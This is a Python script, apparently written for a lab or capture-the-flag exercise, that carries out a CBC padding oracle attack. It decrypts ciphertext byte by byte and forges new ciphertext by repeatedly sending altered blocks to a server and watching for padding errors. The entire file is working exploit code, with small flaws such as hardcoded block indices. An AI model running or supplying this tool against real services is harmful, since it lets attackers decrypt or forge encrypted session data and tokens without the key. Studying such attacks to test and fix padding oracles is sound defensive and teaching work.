"""CBC padding oracle for encryption and decryption

For algorithmic details see: https://www.youtube.com/watch?v=aH4DENMN_O4&ab_channel=intrigano     
"""

from helper import *
from tqdm import tqdm

def padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data_original, base_url, block_size, verbose=True):
    """CBC padding oracle for encryption"""

    print("Encrypting '{}' ... ".format(plain_text_manipulated))

    #################################################################
    # Data preparation
    #################################################################

    # Decode input data
    cipher_text = decode_data(data_original)

    # Split cipher text into blocks    
    cipher_blocks = split_into_blocks(cipher_text, block_size)

    if verbose:
        print_blocks(cipher_blocks)

    # Add padding bytes and split into blocks
    plain_text_original        = pad(plain_text_original, block_size)
    plain_text_original_blocks = split_into_blocks(plain_text_original, block_size)

    # Add padding bytes and split into blocks
    plain_text_manipulated        = pad(plain_text_manipulated, block_size)
    plain_text_manipulated_blocks = split_into_blocks(plain_text_manipulated, block_size)

    if len(cipher_blocks) is not len(plain_text_original_blocks) + 1:
        raise Exception("Error occurred! Cipher text and plain text (original) do not fit regarding length.")

    # Keep last cipher block
    cipher_text_manipulated = cipher_blocks[2]

    # We know the intermediate state for the last block
    # @todo: Replace hardcoded indices by last elements from given cipher/original
    cur_intermediate = XOR_byte_list(plain_text_original_blocks[1], cipher_blocks[1])
    #     cur_intermediate = XOR_byte_list(plain_text_original_blocks[-1], cipher_blocks[-1])

    for plain_block_index in range(len(plain_text_manipulated_blocks), 0, -1):

        print("Encrypting block {}/{} ... ".format( len(plain_text_manipulated_blocks) - plain_block_index + 1, len(plain_text_manipulated_blocks)))

        # Construct new cipher block for manipulated plain text
        cur_cipher = XOR_byte_list(cur_intermediate, plain_text_manipulated_blocks[plain_block_index - 1])

        # Get intermediate state for constructed cipher block
        if plain_block_index > 1:
            rand_iv = "x" * block_size  # Random IV
            cur_plain_text = padding_oracle_decrypt(encode_data(rand_iv + cur_cipher), block_size=block_size, base_url=base_url, verbose=verbose)
            cur_intermediate = XOR_byte_list(cur_plain_text, rand_iv)

        # Use only first cipher text blocks for now
        cipher_text_manipulated = cur_cipher + cipher_text_manipulated 


        print("")

    # Send the changed data to server and check response
    return cipher_text_manipulated



def padding_oracle_decrypt(data, base_url, block_size, verbose=True):
    """CBC padding oracle for decryption"""

    print("Decrypting '{}' ... ".format(data))

    #################################################################
    # Data preparation
    #################################################################

    # Decode input data
    cipher_text = decode_data(data)

    # Split cipher text into blocks    
    cipher_blocks = split_into_blocks(cipher_text, block_size)

    #################################################################
    # Guess the bytes of each block
    #################################################################

    # By changing the forelast block it's possible to change the last block
    # of the plain text. Here we can pretend to have more padding bytes than exist
    # by changing the already known padding bytes and try to find the 
    # correct byte value for the additional "pretended padding byte". If we
    # achieve to not having a PaddingException() we can infer the actual value
    # of this byte in the last block of the plain text. 

    plain_text = []    

    # Decode block by block beginning at the forelast block and last byte
    for block_id in range(len(cipher_blocks) - 2, -1, -1):
        # Get plain text value of missing bytes
        bytes_guessed = {}

        for index in range(block_size - 1, -1, -1):

            # Pretent to have more padding bytes
            cur_num_padding_bytes =  block_size - index
        
            # Change padding-related bytes in forelast block in such way that the same bytes 
            # in the plain text will increment to pretend to have more padding bytes

            # Create copy of original cipher text 
            cipher_blocks_tmp = []
            for i in range( block_id + 2):
                cipher_blocks_tmp.append( cipher_blocks[i] )
                
            for i in range(block_size - cur_num_padding_bytes + 1, block_size):
                # Handle pretended padding bytes 
                old_value = bytes_guessed[i][1]
                padding_bytes = bytes_guessed[i][0]
                new_value = old_value ^ padding_bytes ^ cur_num_padding_bytes
                cipher_blocks_tmp[block_id] = change_byte_at_index(cipher_blocks_tmp[block_id], i, new_value)
            
            # In the next step we find the correct value of the additional pretended padding byte that will not throw PaddingException()
            for value in tqdm(range(256), desc="Guessing block {} byte {}".format(block_id + 1, index)):
                # print("Check for value {} ...".format(value))

                # Find the value that leads to a valid padding byte value in the last block of plain text
                cipher_blocks_tmp[block_id] = change_byte_at_index(cipher_blocks_tmp[block_id], index, value)

                # Send the changed data to server and check response
                response = evaluate_data( encode_data("".join(cipher_blocks_tmp)), base_url=base_url )
            
                # Check if PaddingException() occurs
                if "PaddingException()" not in response.text:
                    # Check corner case: Check that last byte in plain text is for sure 0x01. 
                    # Avoid that following byte is is accindentely padding byte (0x02) which would also be fine with padding, 
                    if index is block_size - 1:
                        # Changing next bit and see if padding still is correct
                        cipher_blocks_tmp_2nd = cipher_blocks_tmp[block_id]
                        cipher_blocks_tmp[block_id] = change_byte_at_index(cipher_blocks_tmp[block_id], index - 1, ord(cipher_blocks_tmp[block_id][index - 1]) + 1)
                        # Send the changed data to server and check response
                        response_2nd = evaluate_data( encode_data("".join(cipher_blocks_tmp)), base_url=base_url )
                        cipher_blocks_tmp[block_id] = cipher_blocks_tmp_2nd

                        if "PaddingException()" in response_2nd.text:
                            # False positive padding
                            continue

                    # Do the math to get the actual plaintext value by having a valid plain text byte and related IV byte
                    plain_text_value = cur_num_padding_bytes ^ value ^ ord(cipher_blocks[block_id][index])
                    plain_text.insert(0, plain_text_value) 
                    bytes_guessed[index] = (cur_num_padding_bytes, value)
                    if verbose:
                        print("")
                        print("Success!")
                        print("")
                        print("Plain text (hex) = {}".format(" ".join("%02x " % x for x in plain_text)))
                        print("Plain text       = {}".format( "".join( chr(x) for x in plain_text).replace('\n','\\n')))
                        print("")
                    break        

    # Debug print of cipher blocks
    if verbose:
        print_blocks(cipher_blocks)

    return "".join( chr(x) for x in plain_text)
